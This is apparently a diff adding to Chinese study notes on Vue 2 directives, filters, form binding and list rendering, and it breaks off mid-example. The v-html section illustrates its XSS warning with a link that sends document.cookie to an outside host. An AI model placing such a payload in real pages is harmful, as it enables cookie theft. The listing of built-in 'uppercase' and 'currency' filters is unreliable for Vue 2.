@@ -1,3 +1,4 @@
+[TOC]
 # 渐进式框架
 
 "渐进式框架"是指一种框架设计理念，它允许开发者在使用框架时逐步采用框架提供的各种功能，而不是强制性地要求开发者一开始就全部采用框架的所有特性。
@@ -461,6 +462,178 @@ vm.count = 1;
 需要注意的是，`watch` 选项可以监听单个属性，也可以监听嵌套属性或数组的变化。除了监听简单的数据属性外，还可以监听对象属性、数组变化等。
 总的来说，`watch` 选项提供了一种便捷的方式来监视数据的变化，并在数据变化时执行相应的操作，可以用于处理复杂的数据变化逻辑。
 
+### 添加响应式属性
+
+[深入响应式原理 — Vue.js (vuejs.org)](https://v2.cn.vuejs.org/v2/guide/reactivity.html)
+
+```
+Vue监视数据的原理：
+	1. vue会监视data中所有层次的数据。
+	2. 如何监测对象中的数据？
+					通过setter实现监视，且要在new Vue时就传入要监测的数据。
+						(1).对象中后追加的属性，Vue默认不做响应式处理
+						(2).如需给后添加的属性做响应式，请使用如下API：
+										Vue.set(target，propertyName/index，value) 或 
+										vm.$set(target，propertyName/index，value)
+	3. 如何监测数组中的数据？
+						通过包裹数组更新元素的方法实现，本质就是做了两件事：
+							(1).调用原生对应的方法对数组进行更新。
+							(2).重新解析模板，进而更新页面。
+	4.在Vue修改数组中的某个元素一定要用如下方法：
+				1.使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
+				2.Vue.set() 或 vm.$set()
+	
+	特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！
+```
+
+`Vue.set()` 方法是Vue.js提供的用于向响应式对象添加响应式属性的方法。在Vue.js中，如果直接给对象添加新属性，Vue无法检测到这个变化，从而无法触发视图的更新。为了解决这个问题，Vue提供了`Vue.set()` 方法来手动将属性添加到响应式对象中，使其成为响应式属性，从而能够触发视图的更新。
+`Vue.set()` 方法的语法如下：
+```javascript
+Vue.set(object, key, value)
+```
+- `object`: 要添加属性的目标对象。
+- `key`: 要添加的属性名。
+- `value`: 要添加的属性值。
+使用`Vue.set()` 方法添加属性后，Vue会在内部调用其依赖追踪系统，确保新添加的属性也是响应式的。这样，无论是在模板中使用这个属性，还是通过JavaScript代码访问它，都能够触发视图的更新。
+示例：
+```javascript
+// 假设data中有一个对象obj
+// 直接给obj添加一个新属性，Vue无法检测到这个变化
+obj.newProperty = 'new value'; // 这样添加属性是不会触发视图更新的
+// 使用Vue.set()方法添加属性
+Vue.set(obj, 'newProperty', 'new value'); // 这样添加属性会触发视图更新
+```
+总之，`Vue.set()` 方法是在Vue.js中用于向响应式对象添加属性以确保属性的响应式的重要方法。通过使用`Vue.set()` 方法，可以确保动态添加的属性也能够被Vue正确地追踪并更新视图。
+
+注意：**Vue.set() 的目标不允许时 vue 的事例对象，也不能是 Vue._data**
+
+### filter 过滤器
+
+```
+过滤器：
+	定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。
+	语法：
+			1.注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}
+			2.使用过滤器：{{ xxx | 过滤器名}}  或  v-bind:属性 = "xxx | 过滤器名"
+	备注：
+			1.过滤器也可以接收额外参数、多个过滤器也可以串联
+			2.并没有改变原本的数据, 是产生新的对应的数据
+```
+
+```html
+<body>
+		<!-- 准备好一个容器-->
+		<div id="root">
+			<h2>显示格式化后的时间</h2>
+			<!-- 计算属性实现 -->
+			<h3>现在是：{{fmtTime}}</h3>
+			<!-- methods实现 -->
+			<h3>现在是：{{getFmtTime()}}</h3>
+			<!-- 过滤器实现 -->
+			<h3>现在是：{{time | timeFormater}}</h3>
+			<!-- 过滤器实现（传参） -->
+			<h3>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
+			<h3 :x="msg | mySlice">尚硅谷</h3>
+		</div>
+
+		<div id="root2">
+			<h2>{{msg | mySlice}}</h2>
+		</div>
+	</body>
+
+	<script type="text/javascript">
+		Vue.config.productionTip = false
+        
+		//全局过滤器
+		Vue.filter('mySlice',function(value){
+			return value.slice(0,4)
+		})
+		
+		new Vue({
+			el:'#root',
+			data:{
+				time:1621561377603, //时间戳
+				msg:'你好，尚硅谷'
+			},
+			computed: {
+				fmtTime(){
+					return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
+				}
+			},
+			methods: {
+				getFmtTime(){
+					return dayjs(this.time).format('YYYY年MM月DD日 HH:mm:ss')
+				}
+			},
+			//局部过滤器
+			filters:{
+				timeFormater(value,str='YYYY年MM月DD日 HH:mm:ss'){
+					// console.log('@',value)
+					return dayjs(value).format(str)
+				}
+			}
+		})
+
+		new Vue({
+			el:'#root2',
+			data:{
+				msg:'hello,atguigu!'
+			}
+		})
+	</script>
+```
+
+在Vue.js中，过滤器（Filters）是一种用来处理 Vue 模板中插值表达式的方法，用于对数据进行一些格式化或处理后再显示在页面上。过滤器可以用在双花括号插值（Mustache）和 `v-bind` 表达式中。
+使用过滤器可以在模板中轻松地实现一些常见的文本格式化操作，比如格式化日期、转换文本大小写、数字格式化等。Vue提供了一些内置的过滤器，同时也支持自定义过滤器。
+##### 内置过滤器
+Vue.js内置了一些常用的过滤器，比如：
+- `uppercase`: 将文本转换为大写。
+- `lowercase`: 将文本转换为小写。
+- `capitalize`: 将文本的首字母大写。
+- `currency`: 格式化数字为货币格式。
+- `date`: 格式化日期。
+##### 使用内置过滤器示例：
+```html
+<div id="app">
+  <p>{{ message | uppercase }}</p>
+  <p>{{ price | currency }}</p>
+</div>
+```
+```javascript
+new Vue({
+  el: '#app',
+  data: {
+    message: 'hello vue',
+    price: 100
+  }
+});
+```
+##### 自定义过滤器
+除了内置过滤器，Vue还支持自定义过滤器，通过`Vue.filter()`方法来定义。自定义过滤器可以接受参数，可以进行更加灵活的数据处理。
+##### 自定义过滤器示例：
+```html
+<div id="app">
+  <p>{{ message | reverse }}</p>
+</div>
+```
+```javascript
+Vue.filter('reverse', function(value) {
+  return value.split('').reverse().join('');
+});
+new Vue({
+  el: '#app',
+  data: {
+    message: 'hello vue'
+  }
+});
+```
+在上面的例子中，自定义了一个名为`reverse`的过滤器，用于将文本颠倒显示。
+总之，Vue的过滤器是一种非常方便的数据处理方式，可以在模板中直接使用，使数据的展示更加灵活和易读。通过内置过滤器和自定义过滤器，可以满足各种数据处理需求。
+
+
+
+
+
 ## 模板语法
 
 root容器里的代码被称为【Vue模板】；
@@ -595,6 +768,214 @@ Vue中有2种数据绑定的方式：
 
 ```html
 <h2 v-model:x="name">你好啊</h2>
+```
+
+##### 收集表单数据
+
+[表单输入绑定 — Vue.js (vuejs.org)](https://v2.cn.vuejs.org/v2/guide/forms.html)
+
+```
+收集表单数据：
+	若：<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。
+	若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。
+	若：<input type="checkbox"/>
+			1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
+			2.配置input的value属性:
+					(1)v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
+					(2)v-model的初始值是数组，那么收集的的就是value组成的数组
+	备注：v-model的三个修饰符：
+					lazy：失去焦点再收集数据
+					number：输入字符串转为有效的数字
+					trim：输入首尾空格过滤
+```
+
+```html
+<body>
+		<!-- 准备好一个容器-->
+		<div id="root">
+			<form @submit.prevent="demo">
+				账号：<input type="text" v-model.trim="userInfo.account"> <br/><br/>
+				密码：<input type="password" v-model="userInfo.password"> <br/><br/>
+				年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/>
+				性别：
+				男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
+				女<input type="radio" name="sex" v-model="userInfo.sex" value="female"> <br/><br/>
+				爱好：
+				学习<input type="checkbox" v-model="userInfo.hobby" value="study">
+				打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
+				吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
+				<br/><br/>
+				所属校区
+				<select v-model="userInfo.city">
+					<option value="">请选择校区</option>
+					<option value="beijing">北京</option>
+					<option value="shanghai">上海</option>
+					<option value="shenzhen">深圳</option>
+					<option value="wuhan">武汉</option>
+				</select>
+				<br/><br/>
+				其他信息：
+				<textarea v-model.lazy="userInfo.other"></textarea> <br/><br/>
+				<input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>
+				<button>提交</button>
+			</form>
+		</div>
+	</body>
+
+	<script type="text/javascript">
+		Vue.config.productionTip = false
+
+		new Vue({
+			el:'#root',
+			data:{
+				userInfo:{
+					account:'',
+					password:'',
+					age:18,
+					sex:'female',
+					hobby:[],
+					city:'beijing',
+					other:'',
+					agree:''
+				}
+			},
+			methods: {
+				demo(){
+					console.log(JSON.stringify(this.userInfo))
+				}
+			}
+		})
+	</script>
+```
+
+#### v-text 
+
+```
+1.作用：向其所在的节点中渲染文本内容。
+2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。
+```
+
+```html
+<div id="root">
+	<div>你好，{{name}}</div>
+	<div v-text="name"></div>
+	<div v-text="str"></div>
+</div>
+
+<script type="text/javascript">
+	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+	
+	new Vue({
+		el:'#root',
+		data:{
+			name:'尚硅谷',
+			str:'<h3>你好啊！</h3>'
+		}
+	})
+</script>
+```
+
+#### v-html
+
+```
+v-html指令：
+	1.作用：向指定节点中渲染包含html结构的内容。
+	2.与插值语法的区别：
+				(1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
+				(2).v-html可以识别html结构。
+	3.严重注意：v-html有安全性问题！！！！
+				(1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
+				(2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
+```
+
+```html
+<div v-html="str2"></div>
+new Vue({
+	el:'#root',
+	data:{
+		str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
+	}
+})
+```
+
+#### v-cloak
+
+```
+v-cloak指令（没有值）：
+	1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
+	2.使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。
+```
+
+```html
+<!-- 准备好一个容器-->
+<div id="root">
+	<h2 v-cloak>{{name}}</h2>
+</div>
+<script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
+<script type="text/javascript">
+	console.log(1)
+	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+	
+	new Vue({
+		el:'#root',
+		data:{
+			name:'尚硅谷'
+		}
+	})
+</script>
+```
+
+#### v-once
+
+```
+v-once指令：
+	1.v-once所在节点在初次动态渲染后，就视为静态内容了。
+	2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。
+```
+
+```html
+<!-- 准备好一个容器-->
+<div id="root">
+	<h2 v-once>初始化的n值是:{{n}}</h2>
+	<h2>当前的n值是:{{n}}</h2>
+	<button @click="n++">点我n+1</button>
+</div>
+<script type="text/javascript">
+	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+	
+	new Vue({
+		el:'#root',
+		data:{
+			n:1
+		}
+	})
+</script>
+```
+
+#### v-pre
+
+```
+v-pre指令：
+	1.跳过其所在节点的编译过程。
+	2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。
+```
+
+```html
+<!-- 准备好一个容器-->
+<div id="root">
+	<h2 v-pre>Vue其实很简单</h2>
+	<h2 >当前的n值是:{{n}}</h2>
+	<button @click="n++">点我n+1</button>
+</div>
+<script type="text/javascript">
+	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+	new Vue({
+		el:'#root',
+		data:{
+			n:1
+		}
+	})
+</script>
 ```
 
 ### 事件处理
@@ -912,7 +1293,6 @@ element.addEventListener('click', myFunction, true);
 当需要在页面插入复杂值时可以采用以下方式
 
 ```html
-<body>
 		<!-- 准备好一个容器-->
 		<div id="root">
 			姓：<input type="text" v-model="firstName"> <br/><br/>
@@ -937,7 +1317,6 @@ element.addEventListener('click', myFunction, true);
 也可以通过函数实现
 
 ```html
-<body>
 		<!-- 准备好一个容器-->
 		<div id="root">
 			姓：<input type="text" v-model="firstName"> <br/><br/>
@@ -999,7 +1378,7 @@ var vm = new Vue({
    - 方法是在调用时执行的函数。每次调用方法时，都会执行其中的代码。
    - 方法适用于需要在模板中触发的事件处理或者动态计算的情况。
    - 方法没有缓存机制，每次调用方法都会执行其中的代码，不会像计算属性一样进行缓存。
-总的来说，计算属性适合用于基于响应式数据进行计算并且需要缓存结果的情况，可以简化模板中的逻辑计算；而方法适合用于需要在模板中触发的事件处理或者动态计算的情况，每次调用方法都会执行其中的代码。根据具体的需求，可以灵活选择使用计算属性或方法来处理逻辑计算。
+   总的来说，计算属性适合用于基于响应式数据进行计算并且需要缓存结果的情况，可以简化模板中的逻辑计算；而方法适合用于需要在模板中触发的事件处理或者动态计算的情况，每次调用方法都会执行其中的代码。根据具体的需求，可以灵活选择使用计算属性或方法来处理逻辑计算。
 
 
 计算属性：
@@ -1076,7 +1455,6 @@ var vm = new Vue({
 当计算属性为只读时可简写为简写形式
 
 ```html
-<body>
 		<!-- 准备好一个容器-->
 		<div id="root">
 			姓：<input type="text" v-model="firstName"> <br/><br/>
@@ -1129,7 +1507,6 @@ var vm = new Vue({
     4.监视属性可以监视计算属性，因为计算属性本身就在 vm 身上
 
 ```html
-<body>
 		<!-- 准备好一个容器-->
 		<div id="root">
 			<h2>今天天气很{{info}}</h2>
@@ -1188,7 +1565,6 @@ var vm = new Vue({
 			(2).使用watch时根据数据的具体结构，决定是否采用深度监视。
 
 ```html
-<body>
 		<!-- 准备好一个容器-->
 		<div id="root">
 			<h2>今天天气很{{info}}</h2>
@@ -1319,47 +1695,625 @@ const vm = new Vue({
 		})
 ```
 
+### 绑定样式
 
+在Vue.js中，可以通过`v-bind:class`和`v-bind:style`指令来动态地绑定样式到元素上。
 
-### q
+1. **动态绑定class**：
+   - 使用`v-bind:class`指令可以动态地绑定一个或多个class到元素上。
+   - 可以直接绑定一个对象，对象的 key 是 class 名称，value 是一个布尔值，为`true`时表示添加该class，为`false`时表示移除该class。
+   - 也可以绑定一个返回对象的计算属性。
+   
+   示例：
+   ```html
+   <div v-bind:class="{ active: isActive, 'text-danger': hasError }"></div>
+   ```
+   
+2. **动态绑定style**：
+   - 使用`v-bind:style`指令可以动态地绑定内联样式到元素上。
+   - 可以直接绑定一个对象，对象的 key 是 CSS 属性名称，value 是对应的值。
+   - 也可以绑定一个返回对象的计算属性。
+   
+   示例：
+   ```html
+   <div v-bind:style="{ color: textColor, fontSize: fontSize + 'px' }"></div>
+   ```
+3. **数组语法**：
+   - 在`v-bind:class`和`v-bind:style`中也可以使用数组语法，用于动态地切换多个样式。
+   
+   示例：
+   ```html
+   <div v-bind:class="[activeClass, errorClass]"></div>
+   ```
 
+```
+1. class样式
+				写法:class="xxx" xxx可以是字符串、对象、数组。
+						字符串写法适用于：类名不确定，要动态获取。
+						对象写法适用于：要绑定多个样式，个数不确定，名字也不确定。
+						数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。
+	2. style样式
+				:style="{fontSize: xxx}"其中xxx是动态值。
+				:style="[a,b]"其中a、b是样式对象。
+```
 
+```html
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>绑定样式</title>
+		<style>
+			.basic{
+				width: 400px;
+				height: 100px;
+				border: 1px solid black;
+			}
+			
+			.happy{
+				border: 4px solid red;;
+				background-color: rgba(255, 255, 0, 0.644);
+				background: linear-gradient(30deg,yellow,pink,orange,yellow);
+			}
+			.sad{
+				border: 4px dashed rgb(2, 197, 2);
+				background-color: gray;
+			}
+			.normal{
+				background-color: skyblue;
+			}
 
+			.atguigu1{
+				background-color: yellowgreen;
+			}
+			.atguigu2{
+				font-size: 30px;
+				text-shadow:2px 2px 10px red;
+			}
+			.atguigu3{
+				border-radius: 20px;
+			}
+		</style>
+		<script type="text/javascript" src="../js/vue.js"></script>
+	</head>
+	<body>
+		<!-- 准备好一个容器-->
+		<div id="root">
+			<!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 -->
+			<div class="basic" :class="mood" @click="changeMood">{{name}}</div> <br/><br/>
 
+			<!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
+			<div class="basic" :class="classArr">{{name}}</div> <br/><br/>
 
+			<!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
+			<div class="basic" :class="classObj">{{name}}</div> <br/><br/>
 
+			<!-- 绑定style样式--对象写法 -->
+			<div class="basic" :style="styleObj">{{name}}</div> <br/><br/>
+			<!-- 绑定style样式--数组写法 -->
+			<div class="basic" :style="styleArr">{{name}}</div>
+		</div>
+	</body>
 
+	<script type="text/javascript">
+		Vue.config.productionTip = false
+		
+		const vm = new Vue({
+			el:'#root',
+			data:{
+				name:'尚硅谷',
+				mood:'normal',
+				classArr:['atguigu1','atguigu2','atguigu3'],
+				classObj:{
+					atguigu1:false,
+					atguigu2:false,
+				},
+				styleObj:{
+					fontSize: '40px',
+					color:'red',
+				},
+				styleObj2:{
+					backgroundColor:'orange'
+				},
+				styleArr:[
+					{
+						fontSize: '40px',
+						color:'blue',
+					},
+					{
+						backgroundColor:'gray'
+					}
+				]
+			},
+			methods: {
+				changeMood(){
+					const arr = ['happy','sad','normal']
+					const index = Math.floor(Math.random()*3)
+					this.mood = arr[index]
+				}
+			},
+		})
+	</script>
+	
+</html>
+```
 
+### 条件渲染（if-else）
 
+在Vue.js中，可以通过`v-if`、`v-else-if`、`v-else`、`v-show`等指令来实现条件渲染，根据表达式的真假来决定是否渲染或显示特定的元素。
+1. **v-if**：
+   - `v-if`指令根据表达式的真假来决定是否渲染元素。
+   
+   示例：
+   ```html
+   <div v-if="isTrue">条件为真时显示的内容</div>
+   ```
+2. **v-else-if**：
+   - `v-else-if`指令用于在多个条件之间切换，前一个条件为假时，判断下一个条件是否为真。
+   
+   示例：
+   ```html
+   <div v-if="condition1">条件1为真时显示的内容</div>
+   <div v-else-if="condition2">条件2为真时显示的内容</div>
+   ```
+3. **v-else**：
+   - `v-else`指令用于在`v-if`之后使用，表示如果前面的条件都不满足，则显示`v-else`指定的内容。
+   
+   示例：
+   ```html
+   <div v-if="condition1">条件1为真时显示的内容</div>
+   <div v-else>条件1为假时显示的内容</div>
+   ```
+4. **v-show**：
+   - `v-show`指令根据表达式的真假来决定是否显示元素，**但是始终会渲染元素到DOM中，只是通过CSS的`display`属性来控制显示或隐藏**。
+   
+   示例：
+   ```html
+   <div v-show="isShow">根据条件显示或隐藏的内容</div>
+   ```
+   通过条件渲染，我们可以根据数据的变化动态地显示或隐藏特定的元素，实现页面内容的动态展示效果。
 
+```
+条件渲染：
+	1.v-if
+				写法：
+						(1).v-if="表达式" 
+						(2).v-else-if="表达式"
+						(3).v-else="表达式"
+				适用于：切换频率较低的场景。
+				特点：不展示的DOM元素直接被移除。
+				注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。
+	2.v-show
+				写法：v-show="表达式"
+				适用于：切换频率较高的场景。
+				特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉
+		
+	3.备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。
+```
 
+```html
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>条件渲染</title>
+		<script type="text/javascript" src="../js/vue.js"></script>
+	</head>
+	<body>
+		<!-- 准备好一个容器-->
+		<div id="root">
+			<h2>当前的n值是:{{n}}</h2>
+			<button @click="n++">点我n+1</button>
+			<!-- 使用v-show做条件渲染 -->
+			<!-- <h2 v-show="false">欢迎来到{{name}}</h2> -->
+			<!-- <h2 v-show="1 === 1">欢迎来到{{name}}</h2> -->
 
+			<!-- 使用v-if做条件渲染 -->
+			<!-- <h2 v-if="false">欢迎来到{{name}}</h2> -->
+			<!-- <h2 v-if="1 === 1">欢迎来到{{name}}</h2> -->
 
+			<!-- v-else和v-else-if -->
+			<!-- <div v-if="n === 1">Angular</div>
+			<div v-else-if="n === 2">React</div>
+			<div v-else-if="n === 3">Vue</div>
+			<div v-else>哈哈</div> -->
 
+			<!-- v-if与template的配合使用 -->
+			<template v-if="n === 1">
+				<h2>你好</h2>
+				<h2>尚硅谷</h2>
+				<h2>北京</h2>
+			</template>
 
+		</div>
+	</body>
 
+	<script type="text/javascript">
+		Vue.config.productionTip = false
 
+		const vm = new Vue({
+			el:'#root',
+			data:{
+				name:'尚硅谷',
+				n:0
+			}
+		})
+	</script>
+</html>
+```
 
+在Vue.js中，`v-if`指令通常用于条件性地渲染元素，但有时候我们希望根据条件渲染多个元素，这时可以结合`<template>`标签来实现。
+使用`<template>`标签可以在不影响最终渲染结果的情况下包裹多个元素，起到一个容器的作用，不会在最终的DOM中留下额外的标记。结合`v-if`指令，我们可以根据条件在`<template>`中包裹多个元素，并根据条件选择性地渲染这些元素。但`<template>`不可与`v-show`配合使用。
+示例代码如下：
+```html
+<template v-if="condition">
+  <p>条件为真时显示的内容1</p>
+  <p>条件为真时显示的内容2</p>
+</template>
+```
+在上面的示例中，如果`condition`为真，则会渲染`<template>`标签内的两个`<p>`元素，如果`condition`为假，则不会在最终的DOM中渲染这两个`<p>`元素。
+使用`<template>`标签配合`v-if`指令可以更加灵活地控制多个元素的条件渲染，同时不会在最终的DOM中留下多余的标记，保持页面结构的清晰和简洁。
 
+### 列表渲染（list）
 
+在Vue.js中，可以使用`v-for`指令来进行列表渲染，即根据数组或对象的数据来动态地渲染多个元素。
+1. **数组渲染**：
+   - 使用`v-for`指令可以遍历数组的每个元素，并根据数组中的数据动态地渲染元素。
+   
+   示例：
+   ```html
+   <ul>
+     <li v-for="item in items" :key="item.id">{{ item.name }}</li>
+   </ul>
+   ```
+2. **对象渲染**：
+   - 除了数组，`v-for`指令也可以遍历对象的属性，并根据对象的数据动态地渲染元素。
+   
+   示例：
+   ```html
+   <ul>
+     <li v-for="(value, key) in object" :key="key">{{ key }}: {{ value }}</li>
+   </ul>
+   ```
+3. **遍历整数**：
+   - 可以使用`v-for`指令来遍历整数，用于生成一定数量的元素。
+   
+   示例：
+   ```html
+   <ul>
+     <li v-for="n in 10" :key="n">第{{ n }}个元素</li>
+   </ul>
+   ```
+4. **遍历数组索引**：
+   - 除了遍历数组的元素，还可以遍历数组的索引。
+   
+   示例：
+   ```html
+   <ul>
+     <li v-for="(item, index) in items" :key="index">索引{{ index }}: {{ item }}</li>
+   </ul>
+   ```
+   通过列表渲染，我们可以根据数组或对象中的数据动态生成多个元素，实现列表展示、循环渲染等功能。
 
+#### v-for
 
+```
+v-for指令:
+	1.用于展示列表数据
+	2.语法：v-for="(item, index) in xxx" :key="yyy"
+	3.可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）
+```
 
+```html
+		<!-- 准备好一个容器-->
+		<div id="root">
+			<!-- 遍历数组 -->
+			<h2>人员列表（遍历数组）</h2>
+			<ul>
+				<li v-for="(p,index) of persons" :key="index">
+					{{p.name}}-{{p.age}}
+				</li>
+			</ul>
 
+			<!-- 遍历对象 -->
+			<h2>汽车信息（遍历对象）</h2>
+			<ul>
+				<li v-for="(value,k) of car" :key="k">
+					{{k}}-{{value}}
+				</li>
+			</ul>
 
+			<!-- 遍历字符串 -->
+			<h2>测试遍历字符串（用得少）</h2>
+			<ul>
+				<li v-for="(char,index) of str" :key="index">
+					{{char}}-{{index}}
+				</li>
+			</ul>
+			
+			<!-- 遍历指定次数 -->
+			<h2>测试遍历指定次数（用得少）</h2>
+			<ul>
+				<li v-for="(number,index) of 5" :key="index">
+					{{index}}-{{number}}
+				</li>
+			</ul>
+		</div>
 
+		<script type="text/javascript">
+			Vue.config.productionTip = false
+			
+			new Vue({
+				el:'#root',
+				data:{
+					persons:[
+						{id:'001',name:'张三',age:18},
+						{id:'002',name:'李四',age:19},
+						{id:'003',name:'王五',age:20}
+					],
+					car:{
+						name:'奥迪A8',
+						price:'70万',
+						color:'黑色'
+					},
+					str:'hello'
+				}
+			})
+		</script>
+```
 
+#### 遍历中的 key
 
+```html
+		<!-- 准备好一个容器-->
+		<div id="root">
+			<!-- 遍历数组 -->
+			<h2>人员列表（遍历数组）</h2>
+			<button @click.once="add">添加一个老刘</button>
+			<ul>
+				<li v-for="(p,index) of persons" :key="index">
+					{{p.name}}-{{p.age}}
+					<input type="text">
+				</li>
+			</ul>
+		</div>
 
+		<script type="text/javascript">
+			Vue.config.productionTip = false
+			
+			new Vue({
+				el:'#root',
+				data:{
+					persons:[
+						{id:'001',name:'张三',age:18},
+						{id:'002',name:'李四',age:19},
+						{id:'003',name:'王五',age:20}
+					]
+				},
+				methods: {
+					add(){
+						const p = {id:'004',name:'老刘',age:40}
+						this.persons.unshift(p)
+					}
+				},
+			})
+		</script>
+```
 
+在默认情况下，使用 v-for 渲染列表时，不指定 key 会默认使用数据的 index 属性作为 key
 
+先填写input框的信息，再点击添加信息，发现信息错乱
 
+解决方法：使用数据唯一标识来替换 key
 
+[API — Vue.js (vuejs.org)](https://v2.cn.vuejs.org/v2/api/#key)
 
+```
+面试题：react、vue中的 key 有什么作用？（key的内部原理）
+	
+	1. 虚拟 DOM 中 key 的作用：
+					key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, 
+					随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：
+					
+	2.对比规则：
+				(1).旧虚拟DOM中找到了与新虚拟DOM相同的key：
+							①.若虚拟DOM中内容没变, 直接使用之前的真实DOM！
+							②.若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。
+				(2).旧虚拟DOM中未找到与新虚拟DOM相同的key
+							创建新的真实DOM，随后渲染到到页面。
+							
+	3. 用index作为key可能会引发的问题：
+						1. 若对数据进行：逆序添加、逆序删除等破坏顺序操作:
+										会产生没有必要的真实DOM更新 ==> 界面效果没问题, 但效率低。
+						2. 如果结构中还包含输入类的DOM：
+										会产生错误DOM更新 ==> 界面有问题。
+	4. 开发中如何选择key?:
+						1.最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。
+						2.如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，
+							使用index作为key是没有问题的。
+```
 
+#### 列表选择性渲染
 
+```html
+<!-- 准备好一个容器-->
+		<div id="root">
+			<h2>人员列表</h2>
+			<input type="text" placeholder="请输入名字" v-model="keyWord">
+			<ul>
+				<li v-for="(p,index) of filPerons" :key="index">
+					{{p.name}}-{{p.age}}-{{p.sex}}
+				</li>
+			</ul>
+		</div>
 
+		<script type="text/javascript">
+			Vue.config.productionTip = false
+			
+			//用watch实现
+			//#region 
+			/* new Vue({
+				el:'#root',
+				data:{
+					keyWord:'',
+					persons:[
+						{id:'001',name:'马冬梅',age:19,sex:'女'},
+						{id:'002',name:'周冬雨',age:20,sex:'女'},
+						{id:'003',name:'周杰伦',age:21,sex:'男'},
+						{id:'004',name:'温兆伦',age:22,sex:'男'}
+					],
+					filPerons:[]
+				},
+				watch:{
+					keyWord:{
+						immediate:true,
+						handler(val){
+							this.filPerons = this.persons.filter((p)=>{
+								return p.name.indexOf(val) !== -1
+							})
+						}
+					}
+				}
+			}) */
+			//#endregion
+			
+			//用computed实现
+			new Vue({
+				el:'#root',
+				data:{
+					keyWord:'',
+					persons:[
+						{id:'001',name:'马冬梅',age:19,sex:'女'},
+						{id:'002',name:'周冬雨',age:20,sex:'女'},
+						{id:'003',name:'周杰伦',age:21,sex:'男'},
+						{id:'004',name:'温兆伦',age:22,sex:'男'}
+					]
+				},
+				computed:{
+					filPerons(){
+						return this.persons.filter((p)=>{
+							return p.name.indexOf(this.keyWord) !== -1
+						})
+					}
+				}
+			}) 
+		</script>
+```
 
+#### 列表排序
+
+```html
+<!-- 准备好一个容器-->
+		<div id="root">
+			<h2>人员列表</h2>
+			<input type="text" placeholder="请输入名字" v-model="keyWord">
+			<button @click="sortType = 2">年龄升序</button>
+			<button @click="sortType = 1">年龄降序</button>
+			<button @click="sortType = 0">原顺序</button>
+			<ul>
+				<li v-for="(p,index) of filPerons" :key="p.id">
+					{{p.name}}-{{p.age}}-{{p.sex}}
+					<input type="text">
+				</li>
+			</ul>
+		</div>
+
+		<script type="text/javascript">
+			Vue.config.productionTip = false
+			
+			new Vue({
+				el:'#root',
+				data:{
+					keyWord:'',
+					sortType:0, //0原顺序 1降序 2升序
+					persons:[
+						{id:'001',name:'马冬梅',age:30,sex:'女'},
+						{id:'002',name:'周冬雨',age:31,sex:'女'},
+						{id:'003',name:'周杰伦',age:18,sex:'男'},
+						{id:'004',name:'温兆伦',age:19,sex:'男'}
+					]
+				},
+				computed:{
+					filPerons(){
+						const arr = this.persons.filter((p)=>{
+							return p.name.indexOf(this.keyWord) !== -1
+						})
+						//判断一下是否需要排序
+						if(this.sortType){
+							arr.sort((p1,p2)=>{
+								return this.sortType === 1 ? p2.age-p1.age : p1.age-p2.age
+							})
+						}
+						return arr
+					}
+				}
+			}) 
+
+		</script>
+```
+
+#### 渲染列表时修改数据不生效问题
+
+先看一个示例
+
+```html
+<!-- 准备好一个容器-->
+		<div id="root">
+			<h2>人员列表</h2>
+			<button @click="updateMei">更新马冬梅的信息</button>
+			<ul>
+				<li v-for="(p,index) of persons" :key="p.id">
+					{{p.name}}-{{p.age}}-{{p.sex}}
+				</li>
+			</ul>
+		</div>
+
+		<script type="text/javascript">
+			Vue.config.productionTip = false
+			
+			const vm = new Vue({
+				el:'#root',
+				data:{
+					persons:[
+						{id:'001',name:'马冬梅',age:30,sex:'女'},
